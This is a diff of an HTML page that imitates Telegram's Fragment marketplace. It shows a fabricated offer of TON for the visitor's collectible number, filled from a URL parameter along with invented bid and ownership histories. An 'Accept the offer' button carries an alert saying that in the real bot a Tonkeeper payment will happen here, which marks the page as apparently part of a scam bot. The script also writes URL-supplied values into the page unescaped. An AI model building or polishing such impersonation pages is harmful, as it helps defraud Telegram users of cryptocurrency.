@@ -1,116 +1,138 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Fragment</title>
-<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
-<style>
-  :root{--bg:#0f1217;--card:#1c222a;--text:#e8eef4;--muted:#8a9eb8;--blue:#248bda;--green:#4db86a}
-  *{margin:0;padding:0;box-sizing:border-box}
-  body{font-family:'Roboto',sans-serif;background:var(--bg);color:var(--text);line-height:1.5;font-size:15px}
-  .nav{background:#171c24;border-bottom:1px solid #2a3848;height:52px;display:flex;align-items:center;padding:0 16px;gap:12px}
-  .number{font-size:28px;font-weight:700;letter-spacing:-1px;margin:20px 16px 8px}
-  .claimed{background:#4db86a;color:#000;font-size:13px;font-weight:500;padding:4px 12px;border-radius:6px;display:inline-block}
-  .card{background:var(--card);border-radius:12px;margin:16px;overflow:hidden}
-  .card-header{background:#242a34;padding:12px 16px;font-size:13px;font-weight:500;color:var(--muted)}
-  .card-body{padding:16px;font-size:15px;line-height:1.4}
-  .ton-icon{width:18px;height:18px;vertical-align:middle;margin-right:4px}
-  .btn-blue{background:#248bda;color:#fff;border:none;border-radius:12px;padding:16px;font-size:17px;font-weight:500;width:100%;margin:16px}
-  .collect-card{margin:16px;background:var(--card);border-radius:12px;padding:16px}
-  .section-title{font-size:17px;font-weight:700;margin:24px 16px 8px;color:var(--text)}
-  table{width:100%;border-collapse:collapse;background:var(--card);border-radius:12px;overflow:hidden;margin:0 16px}
-  th,td{padding:12px 16px;text-align:left;border-bottom:1px solid #2a3848}
-  th{font-size:13px;color:var(--muted);font-weight:500}
-  .addr{color:#4d9ed8;text-decoration:none}
-  .toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#242a34;color:#fff;padding:12px 24px;border-radius:12px;white-space:nowrap}
-</style>
-<script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <meta charset="utf-8">
+    <title>Fragment • Offer</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        :root { --tm-dark: #121519; --accent: #00d1ff; }
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            font-family: 'Roboto', system-ui, sans-serif;
+            background: var(--tm-dark);
+            color: #fff;
+            line-height: 1.4;
+            padding-bottom: 20px;
+        }
+        header { background:#1a1e24; padding:12px 16px; display:flex; align-items:center; gap:12px; border-bottom:1px solid #2a2f38; }
+        .logo { font-size:22px; font-weight:700; letter-spacing:-0.5px; }
+        .number { font-size:28px; font-weight:700; text-align:center; margin:20px 0 8px; }
+        .status { text-align:center; color:#00d1ff; font-size:15px; margin-bottom:20px; }
+        .offer-box {
+            background:#1f242b; margin:0 16px 24px; border-radius:12px; padding:24px 20px; text-align:center;
+        }
+        .offer-title { font-size:18px; margin-bottom:12px; }
+        .offer-amount { font-size:42px; font-weight:700; color:#ffd951; }
+        .ton { font-size:22px; vertical-align:middle; }
+        .accept-btn {
+            background: linear-gradient(90deg, #ffd951, #ffaa22);
+            color:#121519;
+            font-size:18px;
+            font-weight:700;
+            padding:16px 32px;
+            border-radius:9999px;
+            border:none;
+            width:100%;
+            margin-top:24px;
+            box-shadow: 0 4px 20px rgba(255, 217, 81, 0.4);
+        }
+        .section { margin:0 16px 32px; }
+        .section-header { font-size:20px; font-weight:500; margin-bottom:12px; display:flex; align-items:center; gap:8px; }
+        table {
+            width:100%; border-collapse:collapse; background:#1f242b; border-radius:12px; overflow:hidden;
+        }
+        th, td { padding:14px 12px; text-align:left; border-bottom:1px solid #2a2f38; }
+        th { background:#272c34; font-weight:500; font-size:14px; color:#aaa; }
+        .tm-value { font-weight:700; }
+        .icon-ton::before { content:"♾️"; margin-right:4px; font-size:18px; vertical-align:middle; }
+        .tm-wallet { color:#00d1ff; text-decoration:none; }
+        .empty { text-align:center; padding:40px 20px; color:#666; font-style:italic; }
+    </style>
 </head>
 <body>
+    <header>
+        <div class="logo">FRAGMENT</div>
+    </header>
 
-<div class="nav">
-  <span style="font-weight:700">FRAGMENT</span>
-</div>
+    <div class="number" id="number-display">+888 0000 0000</div>
+    <div class="status">Collectible Number • Offered</div>
 
-<div class="number" id="phone">+888 0000 0000</div>
-<span class="claimed" style="margin-left:16px">Claimed</span>
+    <div class="offer-box">
+        <div class="offer-title">Someone offered</div>
+        <div><span class="offer-amount" id="offer-amount">0</span> <span class="ton">TON</span></div>
+        <p style="margin-top:16px; opacity:0.9;">If the price suits you, press the button below</p>
+        <button class="accept-btn" onclick="alert('✅ Offer accepted! (в реальном боте здесь будет Tonkeeper payment)')">
+            Accept the offer
+        </button>
+    </div>
 
-<div class="card">
-  <div class="card-header">What is this?</div>
-  <div class="card-body" id="what-text">
-    Someone offered <img src="data:image/jpeg;base64,...TON_BASE64..." class="ton-icon"> <strong id="offer-amount">0</strong> for your number. If the price suits you, press "Accept the offer".
-  </div>
-</div>
+    <div class="section">
+        <div class="section-header">📋 Collectible Number</div>
+        <p style="padding:0 16px; opacity:0.85;">This collectible number can be used to create a Telegram account not tied to a SIM card.</p>
+    </div>
 
-<button class="btn-blue" onclick="handleAccept()">Accept the offer</button>
+    <!-- Bid History -->
+    <div class="section">
+        <div class="section-header">Bid History</div>
+        <table>
+            <thead>
+                <tr><th>Price</th><th>Date</th><th>From</th></tr>
+            </thead>
+            <tbody id="bid-tbody"></tbody>
+        </table>
+        <div id="bid-empty" class="empty" style="display:none;">No bids yet</div>
+    </div>
 
-<div class="collect-card">
-  <div style="display:flex;justify-content:space-between;align-items:center">
-    <span style="font-weight:500">Collectible Number</span>
-    <span id="collect-number" style="color:#4d9ed8"></span>
-  </div>
-  <div style="margin-top:8px;font-size:14px;color:var(--muted)">This collectible number can be used to create a Telegram account not tied to a SIM card.</div>
-</div>
+    <!-- Ownership History -->
+    <div class="section">
+        <div class="section-header">Ownership History</div>
+        <table>
+            <thead>
+                <tr><th>Sale price</th><th>Date</th><th>Buyer</th></tr>
+            </thead>
+            <tbody id="ownership-tbody"></tbody>
+        </table>
+        <div id="ownership-empty" class="empty" style="display:none;">No ownership history</div>
+    </div>
 
-<div style="text-align:center;margin:20px 0">
-  <a onclick="showToast('Subscribed!')" style="color:#4d9ed8;text-decoration:none">Subscribe to updates</a>
-</div>
+    <script>
+        function populateTable(tbody, data, isOwnership = false) {
+            if (!data || data.length === 0) {
+                document.getElementById(isOwnership ? 'ownership-empty' : 'bid-empty').style.display = 'block';
+                return;
+            }
+            data.forEach(item => {
+                const tr = document.createElement('tr');
+                const priceHTML = item.price === 'Transferred' 
+                    ? `<div class="table-cell"><div class="table-cell-value">${item.price}</div></div>`
+                    : `<div class="table-cell"><div class="table-cell-value tm-value icon-ton">${item.price}</div></div>`;
+                
+                tr.innerHTML = `
+                    ${priceHTML}
+                    <td><div class="table-cell">${item.date}</div></td>
+                    <td><div class="table-cell"><a href="#" class="tm-wallet">${item.buyer}</a></div></td>
+                `;
+                tbody.appendChild(tr);
+            });
+        }
 
-<div class="section-title">Bid History</div>
-<table id="bid-table">
-  <thead><tr><th>Price</th><th>Date</th><th>From</th></tr></thead>
-  <tbody></tbody>
-</table>
+        document.addEventListener('DOMContentLoaded', () => {
+            const params = new URLSearchParams(window.location.search);
+            const encoded = params.get('data');
+            if (!encoded) return;
 
-<div class="section-title">Ownership History</div>
-<table id="ownership-table">
-  <thead><tr><th>Sale price</th><th>Date</th><th>Buyer</th></tr></thead>
-  <tbody></tbody>
-</table>
+            const json = decodeURIComponent(encoded);
+            const data = JSON.parse(json);
 
-<div class="toast" id="toast" style="display:none"></div>
+            // Заполняем основную информацию
+            document.getElementById('number-display').textContent = data.formatted_number || '+888 0000 0000';
+            document.getElementById('offer-amount').textContent = Number(data.amount).toLocaleString('en-US');
 
-<script>
-  const tonSrc = "data:image/jpeg;base64,/9j/..."; // твой оригинальный base64 TON (оставь как был)
-
-  const params = new URLSearchParams(location.search);
-  const data = JSON.parse(decodeURIComponent(params.get('data') || '{}'));
-
-  const number = data.formatted_number || '+888 0000 0000';
-  const amount = parseFloat(data.amount || 0).toLocaleString('en-US');
-
-  document.getElementById('phone').textContent = number;
-  document.getElementById('collect-number').textContent = number;
-  document.getElementById('offer-amount').textContent = amount;
-
-  // Bid History
-  const bidBody = document.querySelector('#bid-table tbody');
-  data.bid_history.forEach(item => {
-    const row = `<tr>
-      <td><strong>${item.price}</strong></td>
-      <td>${item.date}</td>
-      <td><a class="addr" onclick="copyAddr('${item.buyer}')">${item.buyer}</a></td>
-    </tr>`;
-    bidBody.innerHTML += row;
-  });
-
-  // Ownership History
-  const ownBody = document.querySelector('#ownership-table tbody');
-  data.history.forEach(item => {
-    const row = `<tr>
-      <td>${item.price}</td>
-      <td>${item.date}</td>
-      <td><a class="addr" onclick="copyAddr('${item.buyer}')">${item.buyer}</a></td>
-    </tr>`;
-    ownBody.innerHTML += row;
-  });
-
-  function handleAccept() { /* твой старый код */ }
-  function copyAddr(addr) { /* твой старый код */ }
-  function showToast(msg) { /* твой старый код */ }
-
-  if (window.Telegram?.WebApp) Telegram.WebApp.expand();
-</script>
+            // Таблицы
+            populateTable(document.getElementById('bid-tbody'), data.bid_history || []);
+            populateTable(document.getElementById('ownership-tbody'), data.history || [], true);
+        });
+    </script>
 </body>
 </html>
